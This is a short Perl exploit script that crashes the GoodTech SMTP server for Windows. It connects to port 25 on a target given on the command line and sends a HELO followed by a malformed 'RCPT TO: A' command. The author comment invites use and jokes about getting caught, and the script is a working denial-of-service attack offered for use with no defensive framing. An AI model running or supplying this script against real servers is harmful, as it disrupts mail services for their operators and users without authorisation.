#!/usr/bin/perl -w

#written by n3w7yp3
#exploits a DoS condition in GoodTech SMTP server
#note: I did not find this vuln! it first appreared on Bugtraq and vuln-dev.
#do what you will with this script but don't blame me for what
happends if you get caught!

use IO::Socket::INET;
$host = shift || die "Usage: $0 <host>\nHost is the host to DoS.\n";
print "Crashing GoodTech SMTP server for Windows on $host\:25.\n";
$socket = IO::Socket::INET -> new (
        Proto => 'tcp',
        PeerAddr => "$host",
        PeerPort => '25'
                                  ) || die "Unable to connect to $host.\n";
print "Connection established. Sending exploit....\n";
print $socket "HELO owned.com\r\n";
sleep(2);
print $socket "RCPT TO: A\r\n";
close $socket;
print "GoodTech SMTPd for Windows on $host\:25 has been crashed.\n";
exit;
